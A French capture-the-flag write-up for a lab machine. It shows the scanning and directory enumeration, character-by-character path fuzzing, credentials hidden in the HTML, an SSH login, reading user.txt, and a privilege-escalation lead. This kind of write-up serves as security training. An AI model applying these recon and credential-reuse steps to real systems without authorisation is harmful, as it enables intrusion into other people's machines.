# Toss a Coin — user.txt

## 1. Flag

```text
EPI{********}
```

> Le flag exact n'était pas présent dans les éléments fournis ; il est indiqué ci-dessus comme étant à récupérer plutôt que d'en inventer un.

---

## 2. Objectif

L'objectif du challenge est d'obtenir un accès utilisateur à la machine cible `10.10.0.16` et de récupérer le fichier `user.txt`.

L'exploitation repose sur une énumération web particulière permettant de reconstruire progressivement un chemin caractère par caractère, jusqu'à découvrir une page contenant des identifiants SSH.

---

## 3. Techniques utilisées

* Reconnaissance réseau
* Énumération des services
* Énumération de contenu web
* Path traversal / énumération de chemins
* Fuzzing caractère par caractère
* Analyse des redirections HTTP
* Fuite d'identifiants dans du contenu HTML caché
* Connexion SSH
* Lecture de fichier local

---

## 4. Outils utilisés

* `nmap`
* `curl`
* `gobuster`
* Bash
* `ssh`
* `cat`

---

## 5. Reconnaissance

Un scan complet des ports est effectué sur la machine cible :

```bash
nmap -sC -sV -p- -T4 10.10.0.16
```

Les services suivants sont identifiés :

```text
22/tcp — OpenSSH 10.0p2 (Debian 13)
80/tcp — Apache 2.4.68
```

Le serveur HTTP présente le titre :

```text
Toss a coin to your witcher
```

Le port SSH est également accessible et pourra être utilisé une fois des identifiants valides obtenus.

---

## 6. Énumération du site web

Une première requête sur la page d'accueil permet d'obtenir un indice :

```bash
curl http://10.10.0.16/
```

La page contient notamment le message :

```text
Don't fight it, you know you want to sing it, it might even help you out.
```

Cette phrase semble orienter vers une chanson.

Une énumération des répertoires est ensuite effectuée avec Gobuster :

```bash
gobuster dir -u http://10.10.0.16/ \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Un répertoire intéressant est découvert :

```text
/t/
```

---

## 7. Analyse du répertoire `/t/`

L'accès à `/t/` affiche le message :

```text
Do you know the lyrics? this one is pretty famous!
```

Ce nouvel indice confirme que le contenu recherché est lié à des paroles de chanson.

L'analyse du comportement des répertoires révèle une structure particulière : chaque caractère valide correspond à un sous-répertoire.

Par exemple, le début du chemin peut être parcouru sous la forme :

```text
/t/o/s/s/
```

Chaque lettre constitue donc un niveau supplémentaire dans l'arborescence.

Les espaces présents dans les paroles sont représentés par :

```text
_
```

---

## 8. Fuzzing caractère par caractère

Plutôt que d'énumérer manuellement toutes les possibilités, un script Bash est utilisé pour tester automatiquement les caractères possibles.

Le principe consiste à tester :

```text
a → z
_
```

à chaque niveau du chemin.

Les réponses HTTP et les redirections sont utilisées pour déterminer si le caractère testé correspond à la suite du chemin.

Les codes `301` et `200` sont notamment suivis pendant l'énumération.

Le processus permet ainsi de reconstruire progressivement la phrase.

---

## 9. Reconstruction du chemin

Le chemin complet découvert est :

```text
toss a coin to your witcher oh valley of plenty
```

Il s'agit des paroles de la chanson associée à **Jaskier** dans *The Witcher*.

Le chemin web correspondant est donc construit caractère par caractère à partir de `/t/`.

La structure obtenue permet finalement d'atteindre le répertoire contenant une information sensible.

---

## 10. Découverte des identifiants

Dans le répertoire correspondant à :

```text
plenty/
```

une information cachée est présente dans le code HTML.

La balise utilise notamment :

```html
style="display:none"
```

L'analyse du code source permet de récupérer :

```text
jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

Ces informations correspondent à :

```text
Utilisateur : jaskier
Mot de passe : YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

Il est alors possible de tester ces identifiants contre le service SSH découvert précédemment.

---

## 11. Connexion SSH

La connexion SSH est effectuée avec :

```bash
ssh jaskier@10.10.0.16
```

Les identifiants récupérés permettent d'obtenir un shell avec l'utilisateur :

```text
jaskier
```

---

## 12. Récupération de `user.txt`

Le fichier `user.txt` se trouve dans le répertoire personnel de `jaskier` :

```text
/home/jaskier/user.txt
```

Il appartient à l'utilisateur `jaskier` et est lisible depuis le shell obtenu.

La commande utilisée est :

```bash
cat /home/jaskier/user.txt
```

Le flag obtenu doit être reporté ici une fois récupéré.

---

## 13. Piste d'escalade vers root

Une fois connecté en tant que `jaskier`, un fichier particulièrement intéressant est présent dans son répertoire personnel :

```text
/home/jaskier/toss-a-coin.py
```

Ce fichier appartient à :

```text
root
```

La présence d'un script Python appartenant à `root` dans le home d'un utilisateur non privilégié constitue une piste importante pour l'escalade de privilèges.

Il faudra notamment vérifier :

* ses permissions ;
* son contenu ;
* s'il est exécuté périodiquement ;
* la présence d'une tâche `cron` ;
* les processus qui l'exécutent ;
* si l'utilisateur `jaskier` peut modifier le fichier ;
* les arguments avec lesquels il est exécuté.

Le fichier pourrait notamment être associé à une tâche planifiée ou à un autre mécanisme d'exécution privilégiée.

---

## 14. Vulnérabilités identifiées

### 14.1 Énumération de chemins caractère par caractère

L'application expose une structure de répertoires permettant de reconstruire progressivement une chaîne connue.

Cette logique permet de découvrir un chemin qui n'est pas directement révélé par une simple énumération classique.

### 14.2 Information sensible dans le HTML

Les identifiants sont présents dans le code HTML mais masqués visuellement avec :

```html
display:none
```

Cette technique ne constitue pas une protection : les données restent accessibles au client et peuvent être récupérées avec `curl` ou en consultant le code source.

### 14.3 Réutilisation des identifiants pour SSH

Les identifiants découverts sur le serveur web permettent également de s'authentifier sur le service SSH.

---

## 15. Chaîne d'exploitation

```text
Nmap
  ↓
Apache :80
  ↓
curl /
  ↓
Indice sur les paroles
  ↓
Gobuster
  ↓
/t/
  ↓
Énumération caractère par caractère
  ↓
Fuzzing a-z + _
  ↓
"toss a coin to your witcher oh valley of plenty"
  ↓
Répertoire /plenty/
  ↓
HTML caché avec display:none
  ↓
jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
  ↓
SSH
  ↓
jaskier
  ↓
/home/jaskier/user.txt
  ↓
USER FLAG
```

---

## 16. Résumé

Le challenge commence par une reconnaissance classique de la machine `10.10.0.16`, qui révèle SSH sur le port `22` et Apache sur le port `80`.

L'analyse de la page web fournit un premier indice faisant référence à des paroles de chanson. L'énumération révèle ensuite `/t/`, dont le contenu indique que les paroles doivent être retrouvées.

L'application utilise une structure de répertoires dans laquelle chaque caractère valide correspond à un niveau supplémentaire. Un fuzzing automatisé avec les lettres `a-z` et `_` permet de reconstruire :

```text
toss a coin to your witcher oh valley of plenty
```

Dans le répertoire final, des identifiants sont présents dans une balise HTML masquée avec `display:none` :

```text
jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

Ces identifiants permettent ensuite de se connecter en SSH avec l'utilisateur `jaskier`.

Le fichier :

```text
/home/jaskier/user.txt
```

peut alors être lu.

Enfin, le fichier :

```text
/home/jaskier/toss-a-coin.py
```

appartenant à `root` constitue la piste principale pour poursuivre l'exploitation vers `root.txt`.
